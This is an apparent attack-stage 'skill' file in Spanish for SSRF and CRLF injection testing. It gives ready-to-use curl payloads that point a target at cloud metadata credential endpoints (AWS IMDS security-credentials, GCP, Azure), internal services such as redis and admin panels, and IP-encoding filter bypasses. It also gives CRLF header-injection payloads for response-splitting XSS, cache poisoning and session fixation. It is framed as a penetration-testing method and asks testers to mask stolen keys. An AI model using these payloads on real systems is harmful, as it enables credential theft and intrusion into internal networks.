---
name: ssrf-crlf
description: "SSRF y CRLF injection: acceso a metadata endpoints (cloud), internal services, header injection y cache poisoning."
version: 1.0.0
author: Fr4ndev
license: MIT
platforms: [linux, macos]
metadata:
  tags: [attack, ssrf, crlf, cloud, metadata, headers, cache-poisoning]
  tools: [loxs.py, curl, naabutonmap.py]
  required: [curl]
  related_skills: [loxs-scanner, lfi-rfi, xss-hunting]
  stage: attack
---

# SSRF + CRLF Injection

## SSRF — Detección

```bash
python3 tools/loxs/loxs.py -l urls_params.txt -t crlf   # crlf pass incluido

# candidatos SSRF típicos: url=, uri=, path=, dest=, redirect=, domain=, feed=, callback=
grep -iE "\?(url|uri|path|dest|redirect|domain|feed|callback|img|src)=" urls.txt > ssrf_candidates.txt
```

## SSRF — Payloads por capa

```bash
# 1. Metadata cloud (IMDSv1) — AWS
curl -s "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# GCP: http://169.254.169.254/computeMetadata/v1/ con header Metadata-Flavor: Google
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01  + header Metadata: true

# 2. Internos
curl -s "http://target.com/fetch?url=http://127.0.0.1:6379/"     # redis
curl -s "http://target.com/fetch?url=http://localhost:8080/admin"
curl -s "http://target.com/fetch?url=http://[::1]/"              # bypass IPv6

# 3. Bypass de filtros
curl -s "http://target.com/fetch?url=http://0177.0.0.1/"         # octal
curl -s "http://target.com/fetch?url=http://2130706433/"         # decimal
curl -s "http://target.com/fetch?url=http://localtest.me/"       # DNS → 127.0.0.1
curl -s "http://target.com/fetch?url=http://target.com@127.0.0.1/"
```

SSRF completo: `wordlists/ssrf.txt`.

## CRLF — Inyección de headers

```bash
# detection
curl -s -D- "https://target.com/redir?url=example.com%0d%0aX-Injected:%20yes" | grep -i "x-injected"

# escaladas del CRLF:
# 1. Response splitting → XSS: %0d%0a%0d%0a<script>alert(1)</script>
# 2. Cache poisoning: inyecta header que el CDN cachea (X-Forwarded-Host)
# 3. Session fixation: Set-Cookie: session=attacker
```

Wordlist: `wordlists/crlf.txt`, `tools/loxs/payloads/`.

## PoC SSRF con impacto

Muestra: respuesta del metadata endpoint con el `AccessKeyId` parcial (enmascarado) o un internal admin panel screenshot. **No robe tokens completos ni persistas en sistemas internos.**

## CRLF con impacto

Screenshot del header inyectado + demo de que un usuarioFollowing el link ejecuta el JS (o que el CDN sirve la respuesta envenenada a otros usuarios).
